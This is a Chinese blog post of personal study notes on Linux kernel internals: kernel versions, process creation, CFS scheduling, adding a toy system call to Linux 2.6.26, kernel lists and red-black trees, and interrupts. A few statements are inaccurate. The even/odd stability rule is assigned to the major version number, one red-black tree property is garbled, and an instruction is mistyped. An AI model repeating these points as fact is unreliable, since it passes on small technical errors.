</li>
</ul>
</li>
</ul>
<h3 id="1-2-Linux-内核与传统-Unix-系统之间的差异"><a href="#1-2-Linux-内核与传统-Unix-系统之间的差异" class="headerlink" title="1.2 Linux 内核与传统 Unix 系统之间的差异"></a>1.2 Linux 内核与传统 Unix 系统之间的差异</h3><ul>
<li>Linux 支持动态加载内核模块</li>
<li>Linux 支持对称多处理机制（SMP）</li>
<li>Linux 内核支持抢占</li>
<li>Linux 内核不区分线程和其他的一般进程（对于内核来说，所有进程都一样，只不过是其中的一些共享资源而已）</li>
<li>Linux 提供了具有设备类的面向对象的设备模型、热插拔事件，以及用户空间的设备文件系统（sysfs）</li>
</ul>
<h3 id="1-3-Linux-内核版本"><a href="#1-3-Linux-内核版本" class="headerlink" title="1.3 Linux 内核版本"></a>1.3 Linux 内核版本</h3><script type="math/tex; mode=display">主版本号.从版本号.修订版本号.稳定版本号</script><p>由四个数字组成</p>
<ul>
<li>主版本号：<strong>偶数</strong>代表稳定版；<strong>奇数</strong>代表开发版</li>
<li>第四个数字可选，表示稳定版本号。包含了关键性 bug 的修改，是为了解决版本发布周期过长的副作用，更利于系统的稳定性。</li>
</ul>
<h2 id="第-2-章-从内核出发"><a href="#第-2-章-从内核出发" class="headerlink" title="第 2 章 - 从内核出发"></a>第 2 章 - 从内核出发</h2><h3 id="2-1-获取内核源码"><a href="#2-1-获取内核源码" class="headerlink" title="2.1 获取内核源码"></a>2.1 获取内核源码</h3><p><a href="https://www.kernel.org/">https://www.kernel.org/</a></p>
<p><a href="http://cdn.kernel.org/pub/linux/kernel/">旧版 Index of /pub/linux/kernel/</a> 这里下载 linux-2.6.26.tar.gz</p>
<font color="red">注意：内核源码一般安装在 `/usr/src/linux` ，应建立自己的主目录对内核进行修改然后用 root 身份安装，而不是以 root 身份对 `/usr/src/linux` 目录进行修改。</font>

<h3 id="2-2-内核源码树"><a href="#2-2-内核源码树" class="headerlink" title="2.2 内核源码树"></a>2.2 内核源码树</h3><div class="table-container">
<table>
<thead>
<tr>
<th>目录</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>arch</td>
<td>特定体系结构的源码</td>
</tr>
<tr>
<td>block</td>
<td>块设备 I/O 层</td>
</tr>
<tr>
<td>crypto</td>
<td>加密 API</td>
</tr>
<tr>
<td>Documentation</td>
<td>内核源码文档</td>
</tr>
<tr>
<td>drivers</td>
<td>设备驱动程序</td>
</tr>
<tr>
<td>firmware</td>
<td>设备驱动需要的设备固件</td>
</tr>
<tr>
<td>fs</td>
<td>文件系统</td>
</tr>
<tr>
<td>include</td>
<td>内核头文件</td>
</tr>
<tr>
<td>init</td>
<td>内核引导和初始化</td>
</tr>
<tr>
<td>ipc</td>
<td>进程间通信代码</td>
</tr>
<tr>
<td>kernel</td>
<td>核心子系统（如调度程序）</td>
</tr>
<tr>
<td>lib</td>
<td>通用内核函数</td>
</tr>
<tr>
<td>mm</td>
<td>内存管理子系统和 VM</td>
</tr>
<tr>
<td>net</td>
<td>网络子系统</td>
</tr>
<tr>
<td>samples</td>
<td>示范代码</td>
</tr>
<tr>
<td>scripts</td>
<td>编译内核所用的脚本</td>
</tr>
<tr>
<td>security</td>
<td>Linux 安全模块</td>
</tr>
<tr>
<td>sound</td>
<td>语音子系统</td>
</tr>
<tr>
<td>usr</td>
<td>早期用户空间代码</td>
</tr>
<tr>
<td>tools</td>
<td>Linux 开发工具</td>
</tr>
<tr>
<td>virt</td>
<td>虚拟化基础结构</td>
</tr>
</tbody>
</table>
</div>
<h3 id="2-3-编译内核"><a href="#2-3-编译内核" class="headerlink" title="2.3 编译内核"></a>2.3 编译内核</h3><ul>
<li><p>如何减少编译的垃圾信息？</p>
<p>将无用信息重定向到永无返回值的黑洞</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make &gt; /dev/null</span><br></pre></td></tr></table></figure>
<ul>
<li><p>以多个作业编译内核</p>
<p>n 代表要衍生的作业数，每个处理器一般衍生一个或两个作业。如在 16 核处理器上，可以 <code>make -j32</code></p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make -jn &gt; /dev/null</span><br></pre></td></tr></table></figure>
<h3 id="2-4-内核开发的特点"><a href="#2-4-内核开发的特点" class="headerlink" title="2.4 内核开发的特点"></a>2.4 内核开发的特点</h3><ol>
<li>内核编程时，不能访问 C 库，和标准的 C 头文件（因为效率低。不过大部分常用 C 库函数在内核都实现了）</li>
<li>必须使用 GNU C</li>
<li>没有内存保护机制</li>
<li>不使用浮点数运算</li>
<li>每个进程只有一个很小的定长堆栈</li>
<li>注意同步和并发（内核容易发生竞争，解决竞争：自旋锁和信号量）</li>
<li>注重可移植性</li>
</ol>
<h2 id="第-3-章-进程管理"><a href="#第-3-章-进程管理" class="headerlink" title="第 3 章 - 进程管理"></a>第 3 章 - 进程管理</h2><h3 id="3-1-进程（也即：任务-task）"><a href="#3-1-进程（也即：任务-task）" class="headerlink" title="3.1 进程（也即：任务 task）"></a>3.1 进程（也即：任务 task）</h3><p>进程的两种<strong>虚拟机制</strong>：<font color="blue">虚拟处理器</font>和<font color="blue">虚拟内存</font></p>
<ul>
<li>虚拟处理器：让进程觉得自己独享处理器</li>
<li>虚拟内存：让进程觉得自己拥有所有内存资源</li>
</ul>
<font color="red">注意：同一进程中的**线程**之间可以共享虚拟内存，但是每个都拥有自己的虚拟处理器</font>

<h3 id="3-2-进程描述符和任务结构"><a href="#3-2-进程描述符和任务结构" class="headerlink" title="3.2 进程描述符和任务结构"></a>3.2 进程描述符和任务结构</h3><h4 id="3-2-1-进程描述符的组成"><a href="#3-2-1-进程描述符的组成" class="headerlink" title="3.2.1 进程描述符的组成"></a>3.2.1 进程描述符的组成</h4><p>内核把<strong>进程列表</strong>存放在双向循环链表——<strong>任务队列</strong>中，链表每一项都是进程描述符的结构体 <code>task_struct</code> 。具体细节在 <code>linux-2.6.26/include/linux</code>/sched.h，进程描述符包含的数据有：</p>
<ul>
<li>打开的文件</li>
<li>进程的地址空间</li>
<li>挂起的信号</li>
<li>进程状态</li>
<li>进程间的关系等</li>
</ul>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210628230358383.png" alt="image-20210628230358383" style="zoom:80%;"></p>
<p>Linux 通过 slab 分配器分配 task_struct 结构。</p>
<h4 id="3-2-2-五种进程状态"><a href="#3-2-2-五种进程状态" class="headerlink" title="3.2.2 五种进程状态"></a>3.2.2 五种进程状态</h4><ul>
<li>TASK_RUNNING 运行</li>
<li>TASK_INTERRUPTIBLE 可中断</li>
<li>TASK_UNINTERRUPTIBLE  不可中断</li>
<li>__TASK_TRACED 被跟踪</li>
<li>__TASK_STOPPED 停止</li>
</ul>
<h4 id="3-2-3-进程家族树"><a href="#3-2-3-进程家族树" class="headerlink" title="3.2.3 进程家族树"></a>3.2.3 进程家族树</h4><ul>
<li>所有进程都是 PID 为 1 的 init 进程的后代。内核在系统启动的最后阶段启动 init 进程。</li>
</ul>
<h3 id="3-3-进程创建"><a href="#3-3-进程创建" class="headerlink" title="3.3 进程创建"></a>3.3 进程创建</h3><h4 id="3-3-1-主要函数"><a href="#3-3-1-主要函数" class="headerlink" title="3.3.1 主要函数"></a>3.3.1 主要函数</h4><ul>
<li><code>fork()</code>：拷贝当前进程创建一个子进程 </li>
<li><code>exec()</code>：读取可执行文件并将其载入地址空间开始执行</li>
</ul>
<hr>
<h5 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h5><ul>
<li><code>fork</code> 中的拷贝是写时拷贝：只有在需要写入时，数据才会被复制。（避免拷贝大量根本用不到的数据）</li>
<li><code>fork</code> 的实际开销：复制父进程的页表 + 给子进程创建唯一的进程描述符</li>
</ul>
<hr>
<h4 id="fork-的具体流程"><a href="#fork-的具体流程" class="headerlink" title="fork 的具体流程"></a>fork 的具体流程</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fork() 调用 clone()</span><br><span class="line">clone() 调用 do_fork()</span><br><span class="line">do_fork() 调用 copy_process()</span><br></pre></td></tr></table></figure>
<p> <code>copy_process()</code> 拷贝或共享打开的文件、文件系统信息、信号处理函数、进程地址空间、命名空间等。如果 <code>copy_process()</code> 成功返回，新创建的子进程被唤醒并投入使用。<font color="blue"><strong>内核首先执行子进程</strong></font>，因为一般子进程会立马调用 <code>exec()</code> ，这样可以<strong>避免写时复制的额外开销</strong>。（如果先执行父进程，有可能会开始向地址空间写入）</p>
<hr>
<h5 id="拓展-1"><a href="#拓展-1" class="headerlink" title="拓展"></a>拓展</h5><ul>
<li><code>vfork()</code> 与 <code>fork()</code> 的区别</li>
</ul>
<p><code>vfork()</code> 不拷贝父进程的页表项</p>
<hr>
<h3 id="3-4-Linux-的内核线程"><a href="#3-4-Linux-的内核线程" class="headerlink" title="3.4 Linux 的内核线程"></a>3.4 Linux 的内核线程</h3><ul>
<li><p>从内核角度看，并没有线程的概念，Linux 把所有的线程都当作进程实现。线程被视为一个与其他进程共享某些资源的进程。</p>
</li>
<li><p><font color="blue">内核线程与普通的进程间的区别</font>：内核线程没有独立的地址空间，只在内核空间运行，从不切换到用户空间。</p>
</li>
<li>内核进程和普通进程一样，可被调度，可被抢占。</li>
</ul>
<h3 id="3-5-进程的终止"><a href="#3-5-进程的终止" class="headerlink" title="3.5 进程的终止"></a>3.5 进程的终止</h3><p>大部分都要靠 <code>do_exit()</code> 完成，<code>do_exit()</code> 做了一系列工作以后调用 <code>schedule()</code> 切换到新的进程。然后与进程相关联的所有资源就都被释放掉了。但是进程本身占用的内存还需要等父进程释放。</p>
<p>注意：<font color="red">do_exit() 永不返回</font></p>
<h4 id="3-5-1-孤儿进程"><a href="#3-5-1-孤儿进程" class="headerlink" title="3.5.1 孤儿进程"></a>3.5.1 孤儿进程</h4><ul>
<li><p><strong>产生原因</strong>：父进程在子进程之前退出，就会产生孤儿进程。</p>
</li>
<li><p><strong>解决方法</strong>：给子进程在当前线程组找一个爹，找不到就让 init 进程做爹。然后再调用 <code>wait()</code> </p>
</li>
</ul>
<h2 id="第-4-章-进程调度"><a href="#第-4-章-进程调度" class="headerlink" title="第 4 章 - 进程调度"></a>第 4 章 - 进程调度</h2><p>进程调度的作用：决定在什么时间让什么进程运行。</p>
<h3 id="4-1-多任务系统"><a href="#4-1-多任务系统" class="headerlink" title="4.1 多任务系统"></a>4.1 多任务系统</h3><ul>
<li>非抢占式：除非自己停止，不然就一直执行。</li>
<li><strong>抢占式</strong>（绝大多数）：调度程序可以强制挂起一个程序，让其他程序执行。</li>
</ul>
<h3 id="4-2-调度策略"><a href="#4-2-调度策略" class="headerlink" title="4.2 调度策略"></a>4.2 调度策略</h3><p><strong>调度策略</strong>需要在进程响应迅速（<font color="blue">响应时间</font>）和最大系统利用率（<font color="blue">吞吐量</font>）之间寻找平衡。Linux 对进程响应做了优化（缩短响应时间），更倾向于优先调度 I/O 消耗型进程。</p>
<h4 id="4-2-1-基于优先级的调度"><a href="#4-2-1-基于优先级的调度" class="headerlink" title="4.2.1 基于优先级的调度"></a>4.2.1 基于优先级的调度</h4><h5 id="两种不同的优先级范围"><a href="#两种不同的优先级范围" class="headerlink" title="两种不同的优先级范围"></a>两种不同的优先级范围</h5><div class="table-container">
<table>
<thead>
<tr>
<th>度量方法</th>
<th>范围</th>
<th style="text-align:left">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>nice 值</td>
<td>[-20,19] 默认为 0</td>
<td style="text-align:left">1. nice 越低，优先级越高<br>2. 在 Linux 系统中，nice 值代表<strong>时间片</strong>的比例</td>
</tr>
<tr>
<td>实时优先级</td>
<td>[0,99]</td>
<td style="text-align:left">值最高，进程优先级越高</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>查看进程的 <font color="blue">nice 优先级（NI）</font> 和 <font color="blue">实时优先级（RTPRIO）</font>，<code>-</code> 表示不是实时进程</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps -eo state,uid,pid,ppid,ni,rtprio,time,comm</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210629104007997.png" alt="image-20210629104007997" style="zoom:80%;"></p>
<h5 id="时间片的长与短"><a href="#时间片的长与短" class="headerlink" title="时间片的长与短"></a>时间片的长与短</h5><p>时间片是一个数值，表示进程被抢占前能持续运行的时间。</p>
<ul>
<li>过长：系统响应变慢</li>
<li>过短：增大进程切换导致的处理器耗时</li>
</ul>
<h3 id="4-3-Linux-调度算法"><a href="#4-3-Linux-调度算法" class="headerlink" title="4.3 Linux 调度算法"></a>4.3 Linux 调度算法</h3><h4 id="4-3-1-完全公平调度算法-CFS"><a href="#4-3-1-完全公平调度算法-CFS" class="headerlink" title="4.3.1 完全公平调度算法 CFS"></a>4.3.1 完全公平调度算法 CFS</h4><p>Completely Fair Scheduler，相关代码位于 <code>kernel/sched_fair.c</code> ，CFS 允许每个进程运行一段时间、循环轮转、选择运行最少的进程作为下一个运行进程。</p>
<h5 id="a-CFS-的公平体现在哪"><a href="#a-CFS-的公平体现在哪" class="headerlink" title="a. CFS 的公平体现在哪"></a>a. CFS 的公平体现在哪</h5><ul>
<li><font color="blue">CFS 确保给每个进程公平的处理器使用比。</font>（这个处理器使用比如何得到？<strong>nice 值</strong>：任何进程获得的处理器时间由自己和其他进程 nice 值得相对比例决定。nice 对应得时间不再是绝对值，而是处理器使用比）</li>
</ul>
<h5 id="b-CFS-的实现"><a href="#b-CFS-的实现" class="headerlink" title="b. CFS 的实现"></a>b. CFS 的实现</h5><script type="math/tex; mode=display">时间记账 + 进程选择 + 调度器入口 + 睡眠和唤醒</script><ol>
<li><p>时间记账 （<font color="blue">通过 <code>update_curr()</code> 更新 <code>vruntime</code> </font>）</p>
<p>虽然 CFS 没有时间片概念，但为了确保每个进程只在公平分配的处理器时间内运行，还是要维护每个进程运行的时间记账。CFS 通过<strong>调度器实体结构</strong> <code>sched_entity</code> 追踪进程运行记账。</p>
<ul>
<li>该结构体中有一个<strong>虚拟实时</strong>变量 <code>vruntime</code> 存放进程的<strong>虚拟运行时间</strong>。<font color="gray">CFS 使用 vruntime 记录一个程序运行了多长时间以及还要运行多久。</font></li>
</ul>
</li>
<li><p>进程选择</p>
<p><font color="blue">CFS 核心：选择 vruntime 最小的任务</font>。选择算法通过红黑树实现：运行红黑树最左边叶子节点代表的那个进程。具体实现在 <code>kernel/sched_fair.c</code> 的  <code>__pick_next_entity()</code> 函数。</p>
</li>
<li><p>调度器入口 <font color="blue">schedule()</font></p>
<p><code>schedule()</code> 函数会调用 <code>pick_next_task()</code> ，选择最高优先级的进程</p>
</li>
<li><p>睡眠和唤醒</p>
<p>唤醒通过 <code>wake_up()</code> 调用 <code>try_to_wake_up()</code> 实现。</p>
</li>
</ol>
<h3 id="4-4-抢占"><a href="#4-4-抢占" class="headerlink" title="4.4 抢占"></a>4.4 抢占</h3><h4 id="4-4-1-什么情况产生用户抢占"><a href="#4-4-1-什么情况产生用户抢占" class="headerlink" title="4.4.1 什么情况产生用户抢占"></a>4.4.1 什么情况产生用户抢占</h4><ol>
<li>从系统调用返回用户空间时</li>
<li>从中断处理程序返回用户空间时</li>
</ol>
<h4 id="4-4-2-什么情况发生内核抢占"><a href="#4-4-2-什么情况发生内核抢占" class="headerlink" title="4.4.2 什么情况发生内核抢占"></a>4.4.2 什么情况发生内核抢占</h4><ol>
<li>中断处理程序正在执行，且返回内核空间前</li>
<li>内核代码再次具有抢占性的时候</li>
<li>内核中的任务显示调用 <code>schedule()</code></li>
<li>内核中的任务阻塞（同样会调用 <code>schedule()</code>）</li>
</ol>
<h3 id="4-5-与调度相关的系统调用"><a href="#4-5-与调度相关的系统调用" class="headerlink" title="4.5 与调度相关的系统调用"></a>4.5 与调度相关的系统调用</h3><h4 id="4-5-1-与调度策略和优先级相关的系统调用"><a href="#4-5-1-与调度策略和优先级相关的系统调用" class="headerlink" title="4.5.1 与调度策略和优先级相关的系统调用"></a>4.5.1 与调度策略和优先级相关的系统调用</h4><div class="table-container">
<table>
<thead>
<tr>
<th>系统调用</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>nice()</code></td>
<td>设置进程 nice 值</td>
</tr>
<tr>
<td><code>sched_setscheduler()</code></td>
<td>设置进程调度策略</td>
</tr>
<tr>
<td><code>sched_getscheduler()</code></td>
<td>获取..</td>
</tr>
<tr>
<td><code>sched_setparam()</code></td>
<td>设置进程实时优先级</td>
</tr>
<tr>
<td><code>sched_getparam()</code></td>
<td>获取..</td>
</tr>
<tr>
<td><code>sched_get_priority_max()</code></td>
<td>获取实时优先级最大值</td>
</tr>
<tr>
<td><code>sched_get_priority_min()</code></td>
<td>获取实时优先级最小值</td>
</tr>
<tr>
<td><code>sched_rr_get_interval()</code></td>
<td>获取进程的时间片值</td>
</tr>
</tbody>
</table>
</div>
<h4 id="4-5-2-与处理器绑定相关的系统调用"><a href="#4-5-2-与处理器绑定相关的系统调用" class="headerlink" title="4.5.2 与处理器绑定相关的系统调用"></a>4.5.2 与处理器绑定相关的系统调用</h4><div class="table-container">
<table>
<thead>
<tr>
<th>系统调用</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>sched_setaffinity()</code></td>
<td>设置进程的处理器的亲和力</td>
</tr>
<tr>
<td><code>sched_getaffinity()</code></td>
<td>获取..</td>
</tr>
<tr>
<td><code>sched_yield()</code></td>
<td>暂时让出处理器</td>
</tr>
</tbody>
</table>
</div>
<h2 id="第-5-章-系统调用"><a href="#第-5-章-系统调用" class="headerlink" title="第 5 章 - 系统调用"></a>第 5 章 - 系统调用</h2><h3 id="5-1-系统调用的作用"><a href="#5-1-系统调用的作用" class="headerlink" title="5.1 系统调用的作用"></a>5.1 系统调用的作用</h3><p>系统调用相当于在用户进程和硬件设备之间加了中间层。其作用包括：</p>
<ol>
<li>为用户空间提供一种硬件的抽象接口。</li>
<li>保证系统稳定和安全。</li>
<li>为了实现多任务和虚拟内存。</li>
</ol>
<p><strong>系统调用</strong>是用户空间<font color="blue">访问内核的唯一手段</font>；除异常和陷入外，系统调用是内核的唯一合法入口。<br>Linux 中，每个系统调用都被赋予一个系统调用号，系统调用号一旦分配就不会变，内核记录了系统调用表中的所有已注册的系统调用的列表 <code>sys_call_table</code>  </p>
<h3 id="5-2-如何通知内核，自己要执行系统调用？"><a href="#5-2-如何通知内核，自己要执行系统调用？" class="headerlink" title="5.2 如何通知内核，自己要执行系统调用？"></a>5.2 如何通知内核，自己要执行系统调用？</h3><font color="blue">通知内核</font>的机制靠<font color="blue">软中断</font>实现：引发一个异常促使系统切换到内核态，然后去执行异常处理程序（此时实际上就是**系统调用处理程序 system_call()**）。

* <font face="楷体">知识点 一：如何触发软中断？</font>

<p>x86 系统预定义的软中断是<strong>中断号 128</strong> ，通过 <code>int &amp;0x80</code> 或 <code>sysenter</code> 指令触发，后者更快。</p>
<ul>
<li><font face="楷体">知识点 二：通过软中断陷入内核空间（执行系统调用处理程序）后，如何指定恰当的系统调用？</font>

</li>
</ul>
<p>x86 系统通过 <strong>eax 寄存器</strong>将<strong>系统调用号</strong>传给内核。</p>
<h3 id="5-3-系统调用的实现"><a href="#5-3-系统调用的实现" class="headerlink" title="5.3 系统调用的实现"></a>5.3 系统调用的实现</h3><p>虚构一个系统调用 <code>foo()</code> 来观察系统调用的实现步骤</p>
<ol>
<li><p>首先，把新的系统调用 <code>sys_foo()</code> 加入<font color="blue">系统调用表</font>的末尾。</p>
<p>大多数体系结构的系统调用表位于 <code>entry.s</code>，<strong>Linux 2.6 的系统调用表在 <code>linux-2.6.26/arch/x86/kernel/syscall_table_32.S</code> 中</strong></p>
<ul>
<li>查找方法及结果</li>
</ul>
</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep &quot;ENTRY(sys_call_table)&quot; -R .</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210629173934526.png" alt="image-20210629173934526" style="zoom:80%;"></p>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210629173436618.png" alt="image-20210629173436618" style="zoom:80%;"></p>
<ul>
<li>在末尾添加</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.<span class="keyword">long</span> sys_foo 			<span class="comment">/* my_sys_call */</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210629174223271.png" alt="image-20210629174223271" style="zoom:80%;"></p>
<p>所以我们新添加的系统调用的调用号为 327</p>
<ol>
<li><p>把系统调用号加入 <code>asm/unistd.h</code>，<strong>Linux 2.6 对应的文件为 <code>linux-2.6.26/include/asm-x86/unistd_32.h</code></strong></p>
<ul>
<li>查找方法</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep &quot;#define __NR_restart_syscall&quot; -R .</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210629174858689.png" alt="image-20210629174858689" style="zoom:80%;"></p>
</li>
</ol>
<ul>
<li>在该列表中加入下面这行</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_foo		327</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210629175039385.png" alt="image-20210629175039385" style="zoom:80%;"></p>
<ol>
<li><strong>实现 <code>foo()</code> 系统调用。</strong>该系统调用必须编译到核心的内核映像中，所以该例我们将其放到 <code>kernel/sys.c</code> 中。当然，如果其功能与调度相关，也可以放到 <code>kernel/sched.c</code> 中，类比书中 P66 的代码</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . | grep page.h</span><br></pre></td></tr></table></figure>
<p>有</p>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210629193023117.png" alt="image-20210629193023117" style="zoom:80%;"></p>
<ul>
<li>修改代码如下，将代码添加到 <code>linux-2.6.26/kernel/sys.c</code> 中</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm-x86/page.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回每个进程的内核栈大小</span></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_foo</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> THREAD_SIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="5-4-从用户空间访问系统调用"><a href="#5-4-从用户空间访问系统调用" class="headerlink" title="5.4 从用户空间访问系统调用"></a>5.4 从用户空间访问系统调用</h3><p>参考 <a href="https://blog.csdn.net/pleasecallmekaige/article/details/82954775">基于ubuntu14.04下编译linux2.6内核_pleasecallmekaige的博客-CSDN博客</a></p>
<ul>
<li>编译修改后的内核代码 </li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
<p>报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Makefile:434: *** mixed implicit and normal rules: deprecated syntax</span><br><span class="line">Makefile:1550: *** mixed implicit and normal rules: deprecated syntax</span><br><span class="line">make: *** No rule to make target &#x27;menuconfig&#x27;.  Stop.</span><br></pre></td></tr></table></figure>
<p>解决报错<a href="https://blog.csdn.net/whatday/article/details/101792006">参考</a></p>
<p>首先，将 434 行的 </p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">config %config: scripts_basic outputmakefile FORCE</span><br></pre></td></tr></table></figure>
<p>改为</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">%config %config: scripts_basic outputmakefile FORCE</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210629202320129.png" alt="image-20210629202320129" style="zoom:80%;"></p>
<p>再将 1550 行的</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">/ %/: prepare scripts FORCE</span><br></pre></td></tr></table></figure>
<p>改为</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">%/: prepare scripts FORCE</span></span><br></pre></td></tr></table></figure>
<p>然后重新 <code>make menuconfig</code></p>
<ul>
<li><font face="楷体" color="pink">未完待更新</font>

</li>
</ul>
<h2 id="第-6-章-内核数据结构"><a href="#第-6-章-内核数据结构" class="headerlink" title="第 6 章 - 内核数据结构"></a>第 6 章 - 内核数据结构</h2><h3 id="6-1-链表"><a href="#6-1-链表" class="headerlink" title="6.1 链表"></a>6.1 链表</h3><p>内核链表代码在 <code>include/linux/list.h</code> （如 <code>linux-2.6.26/include/linux/list.h</code>）</p>
<p><img src="/2021/06/28/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210630175047243.png" alt="image-20210630175047243" style="zoom:80%;"></p>
<p>内核提供了一组函数来操作链表</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>list_add(struct list_head <em>new, struct list_head </em>head);</td>
<td>在 head 后插入 new 节点</td>
</tr>
<tr>
<td>list_del(struct list_head *entry);</td>
<td>在链表中删除 entry 元素<br>注意：这个操作并不会释放 entry 或 包含 entry 的数据结构占用的内存，只是将 entry 移除链表。</td>
</tr>
<tr>
<td>list_move(struct list_head <em>list, struct list_head </em>head)</td>
<td>从一个链表中移除 list，并将其加入另一个链表的 head 节点后面</td>
</tr>
<tr>
<td>list_move_tail(struct list_head <em>list, struct list_head </em>head)</td>
<td>移到 head 前（链表的末尾）</td>
</tr>
<tr>
<td>list_empty(struct list_head *head)</td>
<td>检查链表是否为空</td>
</tr>
<tr>
<td>list_splice(struct list_head <em>list, struct list_head </em>head)</td>
<td>将 list 指向的链表插入到指定链表的 head 元素后面</td>
</tr>
<tr>
<td>list_splice_init(struct list_head <em>list, struct list_head </em>head)</td>
<td>同上，唯一区别是：由 list 指向的链表要被重新初始化</td>
</tr>
<tr>
<td></td>
</tr>
</tbody>
</table>
</div>
<h3 id="6-2-队列"><a href="#6-2-队列" class="headerlink" title="6.2 队列"></a>6.2 队列</h3><p>Linux 内核通用队列实现称为 kfifo。其实现在 <code>kernel/kfifo.c</code> ，声明在 <code>include/linux/kfifo.h</code> 中。</p>
<h3 id="6-3-映射"><a href="#6-3-映射" class="headerlink" title="6.3 映射"></a>6.3 映射</h3><h3 id="6-4-红黑树"><a href="#6-4-红黑树" class="headerlink" title="6.4 红黑树"></a>6.4 红黑树</h3><h4 id="红黑树的属性"><a href="#红黑树的属性" class="headerlink" title="红黑树的属性"></a>红黑树的属性</h4><ol>
<li>所有节点非黑即红</li>
<li>叶子节点都是黑色</li>
<li>叶子节点不包含数据</li>
<li>所有非叶子节点都有两个子节点</li>
<li>如果一个节点是红色，则它的子节点都是黑色</li>
<li>在一个节点到其叶子节点的路径中，如果总包含相同数目的黑色节点，那该路径是最短的</li>
</ol>
<p>所以，<font color="blue">最深的叶子节点的深度不会大于两倍的最浅叶子节点的深度。</font></p>
<p>Linux 实现的红黑树称为 rbtree，定义在 <code>lib/rbtree.c</code> ，声明在文件 <code>include/linux/rbtree.h</code></p>
<h2 id="第-7-章-中断和中断处理"><a href="#第-7-章-中断和中断处理" class="headerlink" title="第 7 章 - 中断和中断处理"></a>第 7 章 - 中断和中断处理</h2><h3 id="7-1-中断的分类"><a href="#7-1-中断的分类" class="headerlink" title="7.1 中断的分类"></a>7.1 中断的分类</h3><ol>
<li>同步中断（也即异常）：由处理器本身产生</li>
<li>异步中断：由硬件产生</li>
</ol>
<h3 id="7-2-中断处理程序的特点"><a href="#7-2-中断处理程序的特点" class="headerlink" title="7.2 中断处理程序的特点"></a>7.2 中断处理程序的特点</h3><ul>
<li><p>中断处理程序与其他内核函数的区别？</p>
<p>中断处理程序被内核调用来响应中断，它运行在<font color="blue">中断上下文</font>（原子上下文）中，该上下文中的<strong>执行代码不可阻塞</strong>。</p>
</li>
</ul>
<h3 id="7-3-中断处理的上半部与下半部"><a href="#7-3-中断处理的上半部与下半部" class="headerlink" title="7.3 中断处理的上半部与下半部"></a>7.3 中断处理的上半部与下半部</h3><ul>
<li><p><strong>中断处理程序</strong>是<strong>上半部</strong>（top half）：接收到一个中断就立即执行，但只做有严格实现的工作（比如对接受的中断进行应答或复位硬件）。</p>
</li>
<li><p><strong>下半部</strong>是一些能够被允许稍后完成的工作。</p>
</li>
</ul>
<h3 id="7-4-注册中断处理程序"><a href="#7-4-注册中断处理程序" class="headerlink" title="7.4 注册中断处理程序"></a>7.4 注册中断处理程序</h3><ul>
